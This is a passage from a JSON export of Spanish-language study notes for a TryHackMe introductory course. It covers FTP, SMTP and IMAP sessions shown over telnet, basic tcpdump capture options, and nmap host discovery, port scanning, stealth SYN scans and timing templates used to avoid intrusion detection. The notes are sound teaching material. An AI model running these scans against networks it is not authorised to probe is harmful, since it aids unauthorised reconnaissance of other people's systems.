    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Al contrario que HTTP, que est√° dise√±ado para devolver p√°ginas, FTP est√° dise√±ado para transferir archivos.\n\nAlgunos comandos usados por FTP:\n\n- `USER`: Usado para poner el nombre de usuario.\n- `PASS`: Usado para poner la contrase√±a.\n- `RETR`: (Retrieve) es usado para descargar un archivo del servidor FTP al cliente.\n- `STOR`: (Store) es usado para subir un archivo del cliente al servidor FTP.\n\nFTP escucha en el puerto 21 por defecto. La transferencia de informaci√≥n es hecha mediante otra conexi√≥n del cliente al servidor.\n\nAbajo un ejemplo y los pasos seguidos para conectarnos:\n\n- Usamos el nombre de usuario `anonymous` para entrar.\n- As√≠ no necesitamos poner contrase√±a.\n- Usamos `ls` para ver lo que podemos descargar.\n- `type ascii` para cambiar a modo ascii.\n- `get coffee.txt` para poder obtener el archivo que queremos.\n\n```bash\nuser@TryHackMe$ ftp 10.10.178.231  \nConnected to 10.10.178.231 (10.10.178.231). \n220 (vsFTPd 3.0.5) \nName (10.10.178.231:strategos): anonymous \n331 Please specify the password. \nPassword: \n230 Login successful. \nRemote system type is UNIX. \nUsing binary mode to transfer files. \nftp> ls \n227 Entering Passive Mode (10,10,41,192,134,10). \n150 Here comes the directory listing. \n-rw-r--r--    1 0        0            1480 Jun 27 08:03 coffee.txt \n-rw-r--r--    1 0        0              14 Jun 27 08:04 flag.txt \n-rw-r--r--    1 0        0            1595 Jun 27 08:05 tea.txt 226 \nDirectory send OK. \nftp> type ascii \n200 Switching to ASCII mode. \nftp> get coffee.txt \nlocal: coffee.txt remote: coffee.txt \n227 Entering Passive Mode (10,10,41,192,57,100). \n150 Opening BINARY mode data connection for coffee.txt (1480 bytes). \nWARNING! 47 bare linefeeds received in ASCII mode \nFile may not have transferred correctly. \n226 Transfer complete. \n1480 bytes received in 8e-05 secs (18500.00 Kbytes/sec) \nftp> quit \n221 Goodbye.\n```\n\nUsamos Wireshark para examinar los mensajes intercambiados de cerca. Los mensajes del cliente est√°n en rojo y los del servidor en azul. Algunos comandos difieren entre cliente y servidor. Cuando tu tecleas `ls`, al servidor se le manda `LIST`. Otra cosa a destacar es que el listado de directorios y archivos y el archivo descargado son mandados por otra conexi√≥n:\n\n![[083.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. SMTP - Sending Email",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/6-smtp-sending-email/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/6. SMTP - Sending Email.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Como con buscar en la web y descargar archivos, mandar emails tiene su propio protocolo. Simple Mail Transfer Protocol (SMTP) define c√≥mo el cliente de mail se habla con el servidor y viceversa.\n\nVeamos algunos de los comandos usados por dicho protocolo:\n\n- `HELO` o `EHLO` comienza la sesi√≥n.\n- `MAIL FROM` especifica el emisor del mail.\n- `RCPT TO` especifica el receptor del mail.\n- `DATA` indica que el cliente va a empezar a mandar el contenido del mail.\n- `.` se manda en una linea por separado para indicar el final del mail.\n\nA continuaci√≥n un ejemplo de un email mandado por `telnet`:\n\n```bash\nuser@TryHackMe$ telnet MACHINE_IP 25 \nTrying MACHINE_IP... \nConnected to MACHINE_IP. \nEscape character is '^]'. \n220 example.thm ESMTP Exim 4.95 Ubuntu Thu, 27 Jun 2024 16:18:09 +0000 \nHELO client.thm \n250 example.thm Hello client.thm [10.11.81.126] \nMAIL FROM: <user@client.thm> \n250 OK \nRCPT TO: <strategos@server.thm> \n250 Accepted \nDATA \n354 Enter message, ending with \".\" on a line by itself \nFrom: user@client.thm \nTo: strategos@server.thm \nSubject: Telnet email  \nHello. I am using telnet to send you an email! \n. \n250 OK id=1sMrpq-0001Ah-UT \nQUIT \n221 example.thm closing connection \nConnection closed by foreign host.\n```\n\nMandar un email por `telnet` es complicado e ineficiente, pero te ayuda a comprender mejor c√≥mo funciona el protocolo. Una imagen de Wireshark (cliente en rojo y servidor en azul) para visualizarlo mejor:\n\n![[084.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/9-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/9. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "<h2>Puertos Interesantes</h2>\n\n| **Protocolo** | **Transport Protocol** | **Default Port Number** |\n| ------------- | ---------------------- | ----------------------- |\n| TELNET        | TCP                    | 23                      |\n| DNS           | UDP or TCP             | 53                      |\n| HTTP          | TCP                    | 80                      |\n| HTTPS         | TCP                    | 443                     |\n| FTP           | TCP                    | 21                      |\n| SMTP          | TCP                    | 25                      |\n| POP3          | TCP                    | 110                     |\n| IMAP          | TCP                    | 143                     |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. IMAP - Synchronizing Email",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/8-imap-synchronizing-email/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/8. IMAP - Synchronizing Email.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Al trabajar con un s√≥lo dispositivo, POP3 es suficiente. Pero ¬øqu√© pasa si queremos ver el correo del ordenador de nuestra oficina o de nuestro port√°til casero en el m√≥vil? Necesitamos entonces un protocolo que permita la sincronizaci√≥n en lugar de borrarlos despu√©s de recibirlos. Una de esas soluciones es IMAP (Internet Message Access Protocol).\n\nPermite sincronizar mensajes le√≠dos, movidos y borrados. Los comandos IMAP son m√°s complejos:\n\n- `LOGIN <username> <password>`: Autentifica al usuario.\n- `SELECT <mailbox>`: Selecciona la bandeja de correo con la que trabajar.\n- `FETCH <mail_number> <data_item_name>`: Busca  el elemento especificado de un email (body, subject, etc.).\n- `MOVE <sequence_set> <mailbox>`: Mueve el/los email/s especificado/s a otra bandeja.\n- `COPY <sequence_set> <data_item_name>`: Copia el/los email/s especificado/s a otra bandeja.\n- `LOGOUT`: Cierra sesi√≥n.\n\nUn ejemplo de conexi√≥n a IMAP por `telnet`:\n\n```bash\nuser@TryHackMe$ telnet 10.10.41.192 143 \nTrying 10.10.41.192... \nConnected to 10.10.41.192. \nEscape character is '^]'. \n* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready. \nA LOGIN strategos \nA OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW STATUS=SIZE SAVEDATE LITERAL+ NOTIFY SPECIAL-USE] Logged in \nB SELECT inbox \n* FLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft) \n* OK [PERMANENTFLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft \\*)] Flags permitted. \n* 4 EXISTS \n* 0 RECENT \n* OK [UNSEEN 2] First unseen. \n* OK [UIDVALIDITY 1719824692] UIDs valid \n* OK [UIDNEXT 5] Predicted next UID \nB OK [READ-WRITE] Select completed (0.001 + 0.000 secs). \nC FETCH 3 body[] \n* 3 FETCH (BODY[] {445} \nReturn-path: <user@client.thm> \nEnvelope-to: strategos@server.thm \nDelivery-date: Thu, 27 Jun 2024 16:19:35 +0000 \nReceived: from [10.11.81.126] (helo=client.thm)         \n\tby example.thm with smtp (Exim 4.95)         \n\t(envelope-from <user@client.thm>)         \n\tid 1sMrpq-0001Ah-UT         \n\tfor strategos@server.thm;         \n\tThu, 27 Jun 2024 16:19:35 +0000 \nFrom: user@client.thm \nTo: strategos@server.thm \nSubject: Telnet email  \nHello. I am using telnet to send you an email! \n) \nC OK Fetch completed (0.001 + 0.000 secs). \nD LOGOUT \n* BYE Logging out D OK Logout completed (0.001 + 0.000 secs). \nConnection closed by foreign host.\n```\n\nDebajo una imagen con el servidor en azul y el cliente en rojo:\n\n![[086.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Host Discovery - Who is Online",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/2-host-discovery-who-is-online/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/2. Host Discovery - Who is Online.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Esta lecci√≥n se centra en c√≥mo usar `namp` para descubrir dispositivos activos. Nmap usa varios m√©todos sofisticados para descubrirlos.\n\nAntes de empezar, debemos mencionar que Nmap usa m√∫ltiple m√©todos para especificar sus objetivos:\n\n- Rango IP: Usando `-`, si queremos escanear las direcciones IP desde `192.168.0.1` hasta `192.168.0.10`, podemos escribir `192.168.0.1-10`.\n- Subm√°scara de red: Usando `/`, si queremos buscar en el rango `192.168.0.0-255` es lo mismo que escribir `192.168.0.1/24`.\n- Hostname: Podemos especificar el nombre de dominio en lugar de la IP con `example.com`.\n\nDigamos que queremos averiguar los dispositivos activos en una red. Nmap tiene la opci√≥n `-sn`. \n\nAntes de comenzar, deber√≠amos anotar que a lo largo de esta unidad usaremos `nmap` como `root` (con `sudo`). Esto es porque no queremos restringir las habilidades de `nmap`.\n\n------------\n<h2>Escaneando una Red Local</h2>\nEn este contexto, usamos el t√©rmino local para referirnos a la red a la que nosotros mismos estamos conectados. Por estar conectados a dicha red podemos ver las direcciones MAC de los dispositivos. Cuando se escanea la red a la que estamos conectados, Nmap empieza mandando peticiones ARP y cuando un dispositivo responde a esta se le califica como activo.\n\n---------------\n<h2>Escaneando una Red Remota</h2>\nEn este contexto, remoto significa que al menos un router nos separa de esa red. Por esto no podemos mandar peticiones ARP. Nmap no se ve afectado por las limitaciones de `arp-scan` y puede averiguar los dispositivos activos en una red remota igualmente. Veamos c√≥mo lo hace:\n\n- `192.168.11.1` est√° activa y respondi√≥ al paquete ICMP echo (ping).\n- `192.168.11.2` parece inactiva, nmap mand√≥ dos paquetes ICMP echo, dos paquetes TCP con la flag SYN establecida y dos paquetes al puerto 80 con la flag ACK establecida. El objetivo no respondi√≥ ninguna.\n\n![[121.png]]\n\nEs notable que podemos tener m√°s control sobre c√≥mo Nmap descubre dispositivos activos con `-PS[portlist]`, `-PA[portlist]`, `-PU[portlist]` para TCP SYN, TCP ACK, y UDP.\n\nComo aporte final, Nmap ofrece una lista de objetivos con `-sL`. Esto crear√° una lista de los dispositivos que ser√°n escaneados sin escanearlos. Esto nos sirve para asegurarnos de que los objetivos son los correctos.\n\nLa opci√≥n `-sn` no performar√° an√°lisis agresivos, pero tampoco nos dir√° qu√© servicios est√°n siendo utilizados d√≥nde. Para esto es necesario unos escaneos m√°s \"ruidosos\".",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Imagina un escenario donde est√°s conectado a una red haciendo uso de varios recursos online (email, navegador, etc.). Dos preguntas salen:\n\n - ¬øC√≥mo podemos descubrir otros dispositivos activos en la red?\n - ¬øC√≥mo podemos encontrar servicios corriendo en la red en estos dispositivos (SSH, servidores web, etc.)?\n\nUn acercamiento es hacerlo de forma manual. Si nos piden detectar los dispositivos activos en `192.168.0.1/24`, deber√≠amos usar herramientas como `ping` o `arp-scan` para comprobar 254 direcciones. Estas herramientas tienen limitaciones pues `ping` no devolver√° nada si el firewall est√° bloqueando el tr√°fico ICMP y `arp-scan` s√≥lo funciona si nuestro dispositivo est√° conectado a la misma red. Lo mismo para descubrir puertos. Podr√≠amos usar `telnet` pero consumir√≠a much√≠simo tiempo.\n\nUna soluci√≥n muy eficiente es Nmap. Es una herramienta de c√≥digo abierto que fue publicada en 1997. Es un esc√°ner de red flexible y poderoso.\n\n-------------\n<h2>Objetivos de Aprendizaje</h2>\nEsta unidad intenta brindarte conocimientos b√°sicos necesarios para usar `nmap`. Aprenderemos c√≥mo:\n\n- Descubrir dispositivos activos.\n- Encontrar servicios activos en los dispositivos activos.\n- Distinguir los diferentes tipos de escaneos de puertos.\n- Detectar las versiones de los servicios activos.\n- Controlar el timing.\n- Formatear la salida.\n\n<h2>Pre-requisitos</h2>\nDeber√≠as estar familiarizado con el modelo TCP/IP, los conceptos relacionados y sus protocolos.\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Version Detection - Extract More Information",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/4-version-detection-extract-more-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/4. Version Detection - Extract More Information.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "<h2>Detecci√≥n de Sistema Operativo</h2>\nPuedes activar la detecci√≥n de sistema operativo a√±adiendo la opci√≥n `-O`. Aunque el resultado suele ser fiable, es importante saber que no hay un detector de sistema operativo 100% eficaz.\n\n------------------\n<h2>Detecci√≥n de Versiones de Servicios</h2>\nDescubriste varios puertos abiertos y quieres saber qu√© servicios se est√°n ejecutando en ellos. Esto es muy conveniente a la hora de recopilar informaci√≥n. La opci√≥n `-A` activa la detecci√≥n de SO, versi√≥n y traceroute.\n\n-------------\n<h2>Forzando el Escaneo</h2>\nCuando ejecutamos nuestro escaneo usando `-sS`, hay una posibilidad de que el objetivo no responda durante la fase de host discovery (por ejemplo no respondiendo a las peticiones ICMP). Consecuentemente, Nmap lo marcar√° como host inactivo y no lanzar√° escaneo de puertos contra √©l. Sin embargo podemos pedirle a Nmap que trate a todos los dispositivos en la red como activos. Para usar esta opci√≥n escribimos `-Pn`.\n\n<h2>Resumen</h2>\n\n| Opci√≥n | Explicaci√≥n                                          |\n| ------ | ---------------------------------------------------- |\n| `-O`   | Detecci√≥n de sistema operativo.                      |\n| `-sV`  | Detecci√≥n de servicio y versi√≥n.                     |\n| `-A`   | Detecci√≥n de sistema operativo, versi√≥n y m√°s.       |\n| `-Pn`  | Escanea dispositivos que aparentan no estar activos. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Port Scanning - Who is Listening",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/3-port-scanning-who-is-listening/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/3. Port Scanning - Who is Listening.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Antes hemos usado `-sn` para descubrir dispositivos activos. En esta lecci√≥n veremos como descubrir servicios activos escuchando a estos dispositivos. Por dise√±o, TCP tiene 65535 puertos y lo mismo para UDP.\n\n------------------\n<h2>Escaneando Puertos TCP</h2>\nLa forma m√°s b√°sica y sencilla de saber si un puerto TCP est√° abierto es intentar conectarse con `telnet` a dicho puerto.\n\n--------------------\n<h2>Connect Scan</h2>\nPuede ser utilizado usando `-sT`. Intenta completar el three-way handshake con cada objetivo TCP. Si resulta estar abierto y se conecta, Nmap tira la conexi√≥n.\n\nEl la imagen de abajo podemos ver que nuestra m√°quina tiene la IP `192.168.124.148` y el Sistema objetivo tiene TCP en el puerto 22 (abierto) y 23 (cerrado). Marcado con un 1, puedes ver el handshake; con un 2, una conexi√≥n intentada a un puerto cerrado.\n\n![[122.png]]\n\n-----------------\n<h2>SYN Scan (Stealth)</h2>\nAl contrario que el escaneo de conexi√≥n, el escaneo SYN s√≥lo ejecuta el primer paso del handshake (mandar un paquete TCP SYN). Consecuentemente, nunca se completa el handshake. La ventaja principal es que conlleva menos logs y por eso se considera m√°s sigilosa. Puedes usarlo escribiendo `-sS`.\n\nEn la imagen de debajo, podemos escanear el sistema con el puerto 22 abierto. La parte marcada con un 1, muestra el servicio en escucha respondiendo con un paquete TCP SYN-ACK. Sin embargo, Nmap responde con un TCP RST para no completar el handshake. En la parte marcada con un 2, se muestra una conexi√≥n TCP intent√°ndolo en un puerto cerrado. En este caso el intercambio es igual que el del escaneo de conexi√≥n.\n\n![[123.png]]\n\n-----------------------\n<h2>Escaneando Puertos UDP</h2>\nAunque la mayor√≠a de los servicios usan TCP para la comunicaci√≥n, algunos usan UDP. Algunos ejemplos son: DNS, DHCP, NTP (Network Time Protocol), SNMP (Simple Network Management Protocol) y VoIP (Voice over IP). UDP no requiere establecer una conexi√≥n y romperla despu√©s. Es √∫til para comunicaciones de broadcast en vivo.\n\nNmap ofrece la opci√≥n `-sU` para escanear servicios UDP. La imagen de abajo muestra varias respuestas de destino inalcanzable de ICMP, que es el mensaje que devuelven los puertos UDP cerrados.\n\n![[124.png]]\n\n---------------\n<h2>Limitando los Puertos Objetivo</h2>\nNmap escanea los 1000 puertos m√°s comunes por defecto. De todas formas, esto puede no ser lo que necesitas. Es por eso que Nmap tiene algunas opciones m√°s:\n\n- `-F`: Es para modo r√°pido, que escanea los 100 puertos m√°s comunes (en lugar de los 1000).\n- `-p[rango]`: Te permite especificar exactamente el rango de puertos que quieres investigar, por ejemplo del 10 al 1024: `-p10-1024`. Si no estableces un inicio ir√° desde el puerto 1 al que indiques, por ejemplo, del 1 al 25: `-p-25`. Y si quieres mirarlos TODOS, puedes hacer `-p-`, de esta forma mirar√° desde el 1 hasta el 65535.\n\n------------------\n<h2>Resumen</h2>\n\n| Opci√≥n      | Explicaci√≥n                                  |\n| ----------- | -------------------------------------------- |\n| `-sT`       | Escaneo de conexi√≥n, conexi√≥n total TCP.     |\n| `-sS`       | Escaneo sigiloso, s√≥lo la primera parte TCP. |\n| `-sU`       | Escaneo UDP.                                 |\n| `-F`        | Modo r√°pido (100 puertos).                   |\n| `-p[rango]` | Especificar el rango.                        |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Output - Controlling What You See",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/6-output-controlling-what-you-see/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/6. Output - Controlling What You See.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Esta lecci√≥n se centra en:\n\n- Mostrar informaci√≥n adicional mientras el escaneo ocurre.\n- Elegir el formato en el que se guarda el escaneo.\n\n---------------------\n<h2>Verbose y Debug</h2>\nEn algunos casos, el escaneo puede tomar mucho tiempo hasta que muestra resultados que podemos utilizar. Adem√°s puede que haya veces que est√©s interesado en informaci√≥n en tiempo real. La mejor manera de visualizar estos avances en el escaneo es usando `-v`, verbose. Este se puede incrementar con `-vv`, `-vvv` o `-vvvv`. Tambi√©n puedes especificar el nivel de verbose con `-v2` hasta `-v4`. Adem√°s puedes incrementar el nivel de verbose presionando \"v\" despu√©s de que el escaneo haya comenzado.\n\nSi todo este verbose no te satisface, puedes usar el output de debugging. Para ello introduce la opci√≥n `-d`. Puedes incrementar el nivel de debug de manera similar hasta `-d9`.\n\n-------------------\n<h2>Guardar Reportes de Escaneo</h2>\nEn muchos casos necesitaremos guardar los resultados de un escaneo. Nmap nos ofrece varios formatos para hacerlo. Los m√°s √∫tiles a nivel de lectura humana son el normal, XML y formato grepeable. Para hacerlo puedes a√±adir:\n\n- `-oN <file>`: Normal.\n- `-oX <file>`: XML.\n- `-oG <file>`: Grepeable (√∫til para `grep` y `awk`).\n- `-oA <file>`: En todos los formatos.\n\nAl usar `-oA` se generar√°n 3 archivos diferentes con extensiones:\n\n- `gnmap` (grepeable).\n- `nmap` (normal).\n- `xml` (xml).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Nmap - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/0-nmap-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/0. Nmap - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/1. Introduction]]\n[[2. Host Discovery - Who is Online]]\n[[3. Port Scanning - Who is Listening]]\n[[4. Version Detection - Extract More Information]]\n[[5. Timing - How Fast is Fast]]\n[[6. Output - Controlling What You See]]\n[[7. Conclusion and Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Timing - How Fast is Fast",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/5-timing-how-fast-is-fast/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/5. Timing - How Fast is Fast.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Nmap ofrece varias opciones para controlar la rapidez del escaneo.\n\nEjecutar un escaneo de puertos a la velocidad predefinida puede disparar un IDS (Intrusion Detection System). Nmap nos ofrece 6 plantillas de velocidad:\n\n0. Paranoico.\n1. Furtivo.\n2. Educado.\n3. Normal.\n4. Agresivo.\n5. Insano.\n\nPodemos escoger por el n√∫mero o por el nombre, `-T 0` o `-T paranoid`.\n\nA continuaci√≥n una tabla en la que se lanza el mismo ataque a los 100 puertos m√°s usuales con diferentes velocidades: `nmap -sS 10.10.216.1176 -F -T [opcion]`:\n\n| Timing          | Duraci√≥n Total |\n| --------------- | -------------- |\n| T0 (paranoid)   | 9.8 horas      |\n| T1 (sneaky)     | 27.53 minutos  |\n| T2 (polite)     | 40.56 segundos |\n| T3 (normal)     | 0.15 segundos  |\n| T4 (aggressive) | 0.13 segundos  |\n\nEsto se debe al tiempo que espera Nmap entre puerto y puerto.\n\nOtra opci√≥n √∫til es la del n√∫mero de pruebas paralelas (hilos). Este puede ser controlado con `--min-parallelism <numero_hilos>` y `--max-parallelism <numero_hilos>`. Por defecto, `namp` controlar√° autom√°ticamente este n√∫mero.\n\nOtra opci√≥n similar bastante √∫til es la de `--min-rate <n√∫mero>` y `--max-rate <n√∫mero>`. Este controla el n√∫mero de peticiones que `nmap` realiza por segundo.\n\nLa √∫ltima opci√≥n es la de `--host-timeout <tiempo>`. Esta opci√≥n especifica el m√°ximo tiempo que est√°s dispuesto a esperar la respuesta a una petici√≥n.\n\n| Opci√≥n                                                              | Explicaci√≥n                               |\n| ------------------------------------------------------------------- | ----------------------------------------- |\n| `-T<0-5>`                                                           | Plantilla de timing (0-5).                |\n| `--min-parallelism <numprobes>` and `--max-parallelism <numprobes>` | M√≠nimo y m√°ximo de hilos.                 |\n| `--min-rate <number>` and `--max-rate <number>`                     | M√≠nimo y m√°ximo de paquetes por segundo.  |\n| `--host-timeout`                                                    | Tiempo m√°ximo de espera de una respuesta. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Conclusion and Summary",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/7-conclusion-and-summary/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/7. Conclusion and Summary.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Hemos aprendido los b√°sicos de Nmap. Recuerda que es mejor ejecutarlo con `sudo` para poder aprovechar todas sus funcionalidades. A continuaci√≥n una tabla de ayuda:\n\n| Opci√≥n                                                              | Explicaci√≥n                                        |\n| ------------------------------------------------------------------- | -------------------------------------------------- |\n| `-sL`                                                               | Lista los objetivos sin escanearlos.               |\n| **_Host Discovery_**                                                |                                                    |\n| `-sn`                                                               | Escaneo de ping, s√≥lo para descubrir dispositivos. |\n| **_Port Scanning_**                                                 |                                                    |\n| `-sT`                                                               | Escaneo de conexi√≥n (handshake).                   |\n| `-sS`                                                               | Escaneo sigiloso (primer paso s√≥lo).               |\n| `-sU`                                                               | Escaneo UDP.                                       |\n| `-F`                                                                | Modo r√°pido (100 puertos).                         |\n| `-p[range]`                                                         | Especifica un rango de puertos.                    |\n| `-Pn`                                                               | Trata todos los dispositivos como activos.         |\n| **_Service Detection_**                                             |                                                    |\n| `-O`                                                                | Detecci√≥n de Sistema Operativo.                    |\n| `-sV`                                                               | Detecci√≥n de versi√≥n de servicio.                  |\n| `-A`                                                                | Detecci√≥n de SO, versi√≥n y m√°s.                    |\n| **_Timing_**                                                        |                                                    |\n| `-T<0-5>`                                                           | Plantilla de timing (0-5)                          |\n| `--min-parallelism <numprobes>` and `--max-parallelism <numprobes>` | N√∫mero de hilos.                                   |\n| `--min-rate <number>` and `--max-rate <number>`                     | N√∫mero de paquetes por segundo.                    |\n| `--host-timeout`                                                    | Tiempo m√°ximo de respuesta.                        |\n| **_Real-time output_**                                              |                                                    |\n| `-v`                                                                | Nivel de verbose (1-4).                            |\n| `-d`                                                                | Nivel de debug (1-9).                              |\n| **_Report_**                                                        |                                                    |\n| `-oN <filename>`                                                    | Salida normal.                                     |\n| `-oX <filename>`                                                    | Salida XML.                                        |\n| `-oG <filename>`                                                    | Salida grepeable.                                  |\n| `-oA <basename>`                                                    | Salida en todos los formatos.                      |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Basic Packet Capture",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/2-basic-packet-capture/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/2. Basic Packet Capture.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Puedes ejecutar `tcpdump` sin dar par√°metros, sin embargo, esto s√≥lo es √∫til para comprobar que est√° instalado.\n\n--------------\n<h2>Especificar la Interfaz de Red</h2>\nLo primero que debemos decidir es qu√© interfaz de red escuchar usando `-i <interface>`. Podemos elegir usar todas con `-i any`.\n\n---------------------\n<h2>Guardar los Paquetes Capturados</h2>\nEn muchos casos, querremos acceder a los paquetes con posterioridad. Esto puede hacerse usando `-w <file>`. La extensi√≥n m√°s com√∫n es `.pcap`. No ver√°s los paquete en la pantalla al usar esta opci√≥n. Algo a tener en cuenta para guardar los paquetes es que deberemos ser `root` o ejecutar el comando con `sudo`.\n\n-------------\n<h2>Leer Paquetes Capturados de un Archivo</h2>\nPodemos leer los paquetes con tcpdump usando `-r <file>`. Es muy √∫til para aprender sobre el comportamiento de protocolos. Puedes capturar el tr√°fico de red durante un tiempo para un protocolo determinado.\n\n--------------------\n<h2>Limitar el n√∫mero de Paquetes Capturados</h2>\nPuedes especificar el n√∫mero de paquetes capturados especificando la cuenta con `-c <count>`. Sin especificar, la captura continuar√° hasta ser interrumpida por ejemplo con `Ctrl + C`.\n\n--------------------\n<h2>No Resolver Direcciones IP y N√∫meros de Puertos</h2>\nTcpdump resolver√° direcciones IP y mostrar√° nombres de dominio donde sea posible. Para evitar esto se puede usar el argumento `-n`. Si adem√°s no quieres que el puerto 80 sea interpretado como http, puedes usar `-nn` para evitar la resoluci√≥n de ambos.\n\n------------------\n<h2>Producir (m√°s) Verbose</h2>\nSi quieres mostrar m√°s detalles sobre los paquetes puedes usar `-v` para producir un poquito m√°s de verbose. Los argumentos `-vv` y `-vvv` producir√°n m√°s verbose incremental.\n\n-------------\n<h2>Resumen y Ejemplos</h2>\n\n| Comando                | Explicaci√≥n                                                             |\n| ---------------------- | ----------------------------------------------------------------------- |\n| `tcpdump -i INTERFACE` | Captura paquetes de una interfaz de red determinada (`any` para todas). |\n| `tcpdump -w FILE`      | Escribe los paquetes capturados en un archivo.                          |\n| `tcpdump -r FILE`      | Lee los paquetes capturados desde un archivo.                           |\n| `tcpdump -c COUNT`     | Captura un n√∫mero espec√≠fico de paquetes.                               |\n| `tcpdump -n`           | No resuelve direcciones IP.                                             |\n| `tcpdump -nn`          | No resuelve direcciones IP ni puertos.                                  |\n| `tcpdump -v`           | Muestra m√°s detalles (`-vv` y `-vvv` muestran todav√≠a m√°s).             |\n\n- `tcpdump -i eth0 -c 50 -v`: Captura y muestra 50 paquetes escuchando `eth0` y los muestra con un poco m√°s de informaci√≥n.\n- `tcpdump -i wlo1 -w data.pcap`: Captura paquetes hasta ser interrumpido con `Ctrl + C` escuchando en `wlo1` y los guarda en el 